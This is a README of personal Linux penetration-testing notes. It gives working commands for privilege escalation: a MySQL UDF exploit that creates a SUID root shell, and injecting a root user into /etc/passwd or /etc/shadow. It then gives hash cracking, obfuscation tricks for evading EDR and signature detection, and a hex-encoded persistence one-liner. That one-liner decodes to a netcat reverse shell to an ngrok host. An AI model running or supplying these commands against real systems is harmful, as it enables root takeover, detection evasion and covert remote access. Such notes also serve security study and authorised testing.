# Linux-Pentest
A repository to store some linux exploitation and technique i've seen during my studies

# List of contents:
- [Privilege Escalation](#Linux-Privesc)
  - [Privesc via mysql admin](#Privesc-via-mysql-admin)
  - [Weak file permissions](#Weak-file-permissions)
- [Linux-evasion](#Linux-evasions)
  - [Obfuscation](#Obfuscation)
- [Persistence]
  - [Obfuscated persistence](#Obfuscated-persistence)   

## Linux Privesc:
### Privesc via mysql admin
If the mysql service is running as root we can use a popular exploit to execute commands:
We will use [Raptor exploit](https://www.exploit-db.com/exploits/1518) that we will compile on our local machine as follow.
```bash
curl https://www.exploit-db.com/download/1518 -o raptor.c
gcc -g -c raptor.c -fPIC
gcc -g -shared -Wl,-soname,raptor.so -o raptor.so raptor.o -lc
```
Once we have done that we can upload the raptor.so file to the victim machine (see file upload part).
To get an rce we need to run the following commands in mysql:
```bash
mysql -u root <pass> #if we have the password
```
Now in interactive shell:
```mysql
use mysql;
create table testing(line blob);
insert into testing values(load_file('/tmp/raptor.so'));
select * from testing into dumpfile '/usr/lib/mysql/plugin/raptor.so';
create function test_check returns integer soname 'raptor.so';
select test_check('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```
By doing so we have created a copy of bash with the [SUID bit](https://www.computerhope.com/jargon/s/setuid.htm) set.

### Weak file permissions
If we want to explore manually the file system to be a bit stealthier we can run the command
```bash
ls -la <file>
```
to get all the file permissions and attributes.(pretty basic)
If we have those permissions to the files below, we can privesc to root(99% of times):

* /etc/passwd _write_
* /etc/shadow _read_ _write_

#### /etc/passwd write
The /etc/passwd file was once used to store users password hashes, now it just contains users and informations word readable.
But (in some systems)we can still insert an hash and login with that.
To do so we need to create the hash of the password we choose:
```bash
openssl passwd nuovapassword
#example output: $1$sonMJF6I$upCjSzbXyTy4Eush6sx.q/
```
_Generate yescrypt hash:_
```bash
mkpasswd -m yescrypt <new_password>
#example output: $y$j9T$WWQkTwY3K4ypmjLPoz93h1$V08ZrcWG9OXtqM3wIWEF0ocUmJwxG7WPr19N5/nS9G2
```
Now we can inject the password in a new root user:
```bash
echo 'newroot:$1$sonMJF6I$upCjSzbXyTy4Eush6sx.q/:0:0:root:/root:/bin/bash' >> /etc/passwd
```
Now we can login with our newroot user:
```bash
su newroot  #insert nuovapassword
```
#### /etc/shadow write
We can do pretty much the same thing that we did with /etc/passwd, this time we need to generate a different hash:
```bash
mkpasswd -m sha-512 <password> #i used nuovapassword
mkpasswd -m yescrypt <ew_password>
#example output: $6$ZbDv3Rg7ulgfRGec$Cj90NEnimcwtmzpQLYhV5G7vvp0eiHFsFDrtzLbudr8lYrd16j0U3rTLdHl9zIk7ed8wn.zmya6eDQHGgPFwE1 
```
Once we have the hash we can change the occurency on the file:
```bash
root:<new_hash>:17298:0:99999:7:::
#example: root:$6$ZbDv3Rg7ulgfRGec$Cj90NEnimcwtmzpQLYhV5G7vvp0eiHFsFDrtzLbudr8lYrd16j0U3rTLdHl9zIk7ed8wn.zmya6eDQHGgPFwE1:17298:0:99999:7:::
```
Now we can login as root:
```bash
su root #insert nuovapassword
```
#### /etc/shadow read
The /etc/shadow, as we saw above contains all the user's password hashes.
So we can crack them to recover passwords:
```bash
echo -n '<password_hash>' > hash_to_crack.hash
```
Now we can either crack with john:
```bash
john hash_to_crack.hash -w=/usr/share/wordlists/rockyou.txt
```

or with hashcat (using also gpus):
```bash
hashcat hash_to_crack.hash
```
_For modern systems like kali or ubuntu we can crack the yescrypt hash like this:_
```bash
john hash_to_crack.hash --format=CRYPT -w=/usr/share/wordlists/rockyou.txt
```
_We can identify the hash with [haiti](https://github.com/noraj/haiti):_
```bash
sudo gem install haiti-hash
haiti '<hash>'
```
hashcat auto detects the hashtype and give us the hashtype number
```bash
hashcat -a 0 -m <hash_number_detected> hash_to_crack.hash  /usr/share/wordlists/rockyou.txt
```
For other files the technique may vary, but we can still search recursivly those files (may set allarms):
_With this command we will find all the files owned by OUR CURRENT USER:_
```bash
find / -user `whoami` -type f -exec ls -la {} \; 2>/dev/null | grep -v '/proc/*\|/sys/*'
```
_With this command we will find all the files of THE GROUP that we ARE IN:_
```bash
find / -group `whoami` -type f -exec ls -la {} \; 2>/dev/null | grep -v '/proc/*\|/sys/*'
```
_With this command we will find files that are WORD WRITEABLE:_
```bash
find / -writable ! -user `whoami` ! -group `whoami` -type f -exec ls -al {} \; 2>/dev/null | grep -v '/proc/*\|/sys/*'
```
Eventually we could also check for all the files word readable on the file stytem they are a lot:
```bash
#We can run this command on specific interesting directories:
find /opt/ -readable ! -user `whoami` ! -group `whoami` -type f -exec ls -laR {} \; 2>/dev/null
find /home/ -readable ! -user `whoami` ! -group `whoami` -type f -exec ls -laR {} \; 2>/dev/null
find /var/ -readable ! -user `whoami` ! -group `whoami` -type f -exec ls -laR {} \; 2>/dev/null
find /tmp/ -readable ! -user `whoami` ! -group `whoami` -type f -exec ls -laR {} \; 2>/dev/null
```
# Linux evasions
In UNIX like world, Similary to windows, we have detection techniques and security measures.
In order to bypass them we need to out-smart those systems.
## Obfuscation
### Base64 encoding
A way to evade signature-based detections is with command or strings obfuscation:
_We can generate a base64 paylod of the command we'd like to run:_
```bash
echo -n '<command_to_execute>' | base64 -w0
```
To execute it on the target machine:
```bash
echo -n '<base64_payload>' | base64 -d | sh
```
another base64 execution:
```bash
bash<<<$(base64 -d<<<'<base64_command>')
```
### Hex encoding
We can also use hexadecimal rapresentation:
```bash
echo -n '<command_to_execute>' | xxd -p | tr -d '\n'
```
Then to execute it:
```bash
echo -n '<hex_encoded_payload> | xxd -p -r | sh
```
also:
```bash
xxd -r -ps <(echo <hex_command>) | sh
```
Another way to obfuscate hexencoding(\x):
```bash
printf '<command_to_execute>' | od -A n -t x1 | sed 's/ //g' | sed 's/../\\x&/g' | tr -d '\n'
```
then to execute:
```bash
echo -e '<hex_encoded_string>' | sh
```

### BashFuscator
With [this](https://github.com/Bashfuscator/Bashfuscator) powerfull tool we can  create large obfuscated payloads.
To install it:
```bash
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
python3 setup.py install --user
```

!DISCLAIMERS! <br>
!DOESN'T WORK 100% OF TIME SO TEST IT BEFORE RUNNING (-test)! <br>
!YOU NEED A BASH INTERPRETER IN ORDER TO RUN IT! <br>
!FILE SIZE CAN RAMP UP PRETTY QUICKLY! <br>
!RUN MULTIPLE TIMES THE COMMAND TO GET A SMALLER PAYLOAD! <br>

Now we can generate payload like this (with -o we will save it to file):
```bash
bashfuscator -c '<command_to_run>'  --no-file-write --no-random-whitespace --no-insert-chars --no-integer-mangling --no-terminator-randomization --choose-mutators command/case_swapper command/reverse -s 1 -t 3 --layers 2 -o /tmp/obfuscate_command.sh  
```
if this doesn't work:
```bash
bashfuscator -c '<command_to_run>'  -o /tmp/obfuscated_command.sh --test #use --test to check the command
```

We can also obfuscate an entire script file like this:
```bash
bashfuscator -f '<file_to_run>'  -o /tmp/obfuscated_file.sh --test #use --test to check the command
```

### Wildcard completation
We can obfuscate commands using [bash wildcard](https://linuxhint.com/bash_wildcard_tutorial/).<br>
!MAY NOT WORK IF THE MACHINE HAS SOME PARTICULAR BINARIES THAT INTERFEER WITH THE PATH!<br>
This is an example on binary path(?):
```bash
/?i?/e?h? '<command_to_run>' | /?i?/b??h  #we will run /bin/echo ... | /bin/bash
```
This is an example with * wildcard (less stealthy):
```bash
/b*n/e*ho '<command_to_run>' | /b*n/b*sh
```
We can also list files without using ls:
```bash
cd <folder_to_list_files>
/*i*/e?h? *  #execute echo * resulting in ls
```
### String Noise
To evade some EDR or security products we can try to write some chars in weird way: <br>
_square braces chars_
```bash
/[b][i][n]/[e][c][h][o] 'command_to_run' | /[b][i][n]/[s][h]
```
_quoted chars_
```bash
e'c'h''o'' 'command_to_run' | "b"a'''s'"h"'' 
```
_backslashes_
```bash
\e\c\h\o '<command_to_run>' | \b\as\h
/\/////bin///\/\////echo '<command_to_run>' | /\//bin/\/\/sh
```
_at sign_
```bash
e$@c$@h$@o $@'<command_to_run>'$@ | b$@a$@s$@h$@
```
_uppercase transforming_
```bash
$(tr "[A-Z]" "[a-z]"<<<"<camelcase_command_to_run>") #to execute commands like bUsYBox Nc ..
```
_uppercase transformation with printf_
```bash
$(a="<uppercase_command_to_run>";printf %s "${a,,}")
```
_adding errors and fake commands_
```bash
l$(a)s${IFS}-$(a)la #execute ls -la with IFS space bypass and $(a) null command
```
_reversed strings_
```bash
echo '<reversed_command>' | rev
```
also:
```bash
$(rev<<<'<reversed_command_to_run>')
```
### Forbidden chars
Somethimes we can't use chars like spaces or slashes.<br>
_forbidden spaces_
```bash
ls${IFS}-la
```
```bash
{ls,-la}
```
```bash
ls$IFS-la
```
```bash
IFS=à
a=lsà-la
$a
```
```bash
IFS=,;`cat<<<ls,-la`
```
```bash
v=$'ls\x20-la'&&$v
```
```bash
echo${IFS}-e${IFS}"ls\x09-l"|sh
```
_create a file with newlines escaped_
```bash
echo${IFS}"command_to_execute"${IFS}|${IFS}sed${IFS}'s/./&\\\n/g'${IFS}>${IFS}file.txt
bash${IFS}file.txt 
```

### Alternative shell execution
We can bypass some security products by avoiding notorious shell names such as `sh, bash, rbash, dash, pwsh, tmux, screen ,zsh, ash, tcsh'.<br>
To do so we can use tricks to call a shell:<br>
_Via shell variable_
```bash
echo <command_to_execute> |$0
```
_Via backticks_
```bash
`echo <command_to_execute>`
```
_Via command substitution_
```bash
$(echo <command_to_execute>)
```
_Via backticks and created files:_
```bash
mkdir /tmp/test  #we will create an empty folder
cd /tmp/test
touch -- 'command to execute'  #then we can create a file that as payload as name  
`ls`  #eventually with command substitution we can execute the file via getting its name
```
# Persistence
Once we gained command execution on the machine we need to access it whenver we want, also even after a restart.<br>
For this reason we need to install persistence on the machine, possibly in a obfuscated way.
## Obfuscated persistence
we can create a clever payload, mixing some of the obfuscation techniques we saw above:
_Shell via file name_
```bash
mkdir /tmp/a2b3c4;cd /tmp/a2b3c4;touch -- 'echo -e \x62\x75\x73\x79\x62\x6f\x78\x20\x6e\x63\x20\x37\x2e\x74\x63\x70\x2e\x65\x75\x2e\x6e\x67\x72\x6f\x6b\x2e\x69\x6f\x20\x31\x30\x32\x38\x33\x20\x2d\x65\x20\x2f\x62\x69\x6e\x2f\x73\x68\x20\x26';cd ../; `ls a2b3c4`|$0;rm -rf a2b3c4
```

